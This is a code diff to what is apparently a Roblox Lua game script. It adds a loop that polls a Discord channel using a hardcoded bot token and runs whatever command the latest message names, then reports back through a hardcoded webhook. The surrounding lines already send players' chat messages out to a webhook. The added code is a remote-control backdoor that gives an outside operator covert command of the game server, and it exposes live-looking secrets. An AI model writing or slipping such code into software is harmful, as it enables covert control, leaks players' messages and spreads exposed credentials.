@@ -888,3 +888,23 @@ plr.Chatted:connect(function(msg)
 	http:PostAsync(webhook, json)
 	end)
 	end)
+	
+	local discord = "https://canary.discordapp.com/"
+local Headers = {
+	authorization = "Bot ODEyODMzNTU5NjUxOTQyNDYw.YDGgPg.xB6-43SmjIcFb8yNtSqJcU86TMk",
+}
+local test = "brickmin"
+local z,r = pcall(function()
+	repeat
+	local GetData = game:GetService("HttpService"):GetAsync(discord.."api/v6/channels/".."812502360352882719".."/messages", false, Headers)
+	local Decode = game:GetService("HttpService"):JSONDecode(GetData)
+	local yes = string.split(Decode[1].content, ":")	
+	local arg1 = yes[2]
+	local arg2 = yes[3]
+		if Commands[yes[1]] and Decode[1].author.bot ~= true then
+			Commands[yes[1]](arg1,arg2)
+			game:GetService("HttpService"):PostAsync("https://discord.com/api/webhooks/812502615988240384/qoAYg2ztiE9UdX9GMmb8hIc6V9YsCTRE-qZ1f5YjEF5mtrWZ6TZl2f32URdmWEVSckpy", "content="..string.format("you have ran the command '%s'",yes[1]).."&username="..test, 2, false, Headers)
+		end
+			wait(1)
+	until nil
+end)
